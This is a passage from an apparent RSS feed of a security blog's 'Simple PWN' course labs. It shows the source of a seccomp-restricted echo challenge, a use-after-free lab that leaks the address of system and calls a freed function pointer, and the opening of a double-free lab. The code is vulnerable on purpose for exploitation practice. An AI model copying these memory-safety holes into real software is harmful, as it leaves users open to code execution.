&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_LD &lt;span style="color:#f92672">|&lt;/span> BPF_W &lt;span style="color:#f92672">|&lt;/span> BPF_ABS, SyscallNum),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(open),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(openat),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(read),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(write),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(close),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(readlink),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(getdents),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(getrandom),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(brk),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(rt_sigreturn),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(exit),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(exit_group),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_RET &lt;span style="color:#f92672">|&lt;/span> BPF_K, SECCOMP_RET_KILL),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_fprog&lt;/span> filterprog&lt;span style="color:#f92672">=&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	.len&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">sizeof&lt;/span>(seccompfilter)&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_filter&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	.filter&lt;span style="color:#f92672">=&lt;/span>seccompfilter
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">apply_seccomp&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(prctl(PR_SET_NO_NEW_PRIVS,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		perror(&lt;span style="color:#e6db74">&amp;#34;Seccomp Error&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&lt;span style="color:#f92672">&amp;amp;&lt;/span>filterprog)&lt;span style="color:#f92672">==-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		perror(&lt;span style="color:#e6db74">&amp;#34;Seccomp Error&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	apply_seccomp();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf2[&lt;span style="color:#ae81ff">0x30&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// long n2 = 0x30;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#75715e">// char msg[0x20];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#66d9ef">char&lt;/span> name[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// long n = 20;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	n2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Haaton&amp;#39;s name? &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	n &lt;span style="color:#f92672">=&lt;/span> read(&lt;span style="color:#ae81ff">0&lt;/span>, name, n);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	name[n] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	strcpy(msg, name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	strcat(msg, &lt;span style="color:#e6db74">&amp;#34; hachamachama&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(msg);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;ECHO HACHAMA!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		read(&lt;span style="color:#ae81ff">0&lt;/span>, buf2, n2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(buf2, &lt;span style="color:#e6db74">&amp;#34;HACHAMA&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			write(&lt;span style="color:#ae81ff">1&lt;/span>, buf2, n2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x38(Lab - UAF)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/</guid><description>&lt;h1 id="simple-pwn-0x38lab---uaf">
 Simple PWN 0x38(Lab - UAF)
 &lt;a class="anchor" href="#simple-pwn-0x38lab---uaf">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/ByxvsvNr6.png" alt="圖片" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">default_handle&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;EVENT: get event named &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>event_handle)(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span> &lt;span style="color:#f92672">*&lt;/span>entities[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. register entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. delete entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. set name&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;4. trigger event&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">register_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx] &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle &lt;span style="color:#f92672">=&lt;/span> default_handle;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Default Event&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">set_name&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Nmae Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		len &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name &lt;span style="color:#f92672">=&lt;/span> malloc(len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		read(&lt;span style="color:#ae81ff">0&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, len &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">trigger_event&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;gift1: %p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>system);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;gift2: %p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, ptr);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			register_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			set_name();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			trigger_event();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x39(Lab - Double Free)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/</guid><description>&lt;h1 id="simple-pwn-0x39lab---double-free">
 Simple PWN 0x39(Lab - Double Free)
 &lt;a class="anchor" href="#simple-pwn-0x39lab---double-free">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rkD83kaji">0x18(Lab - &lt;code>babynote&lt;/code>)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
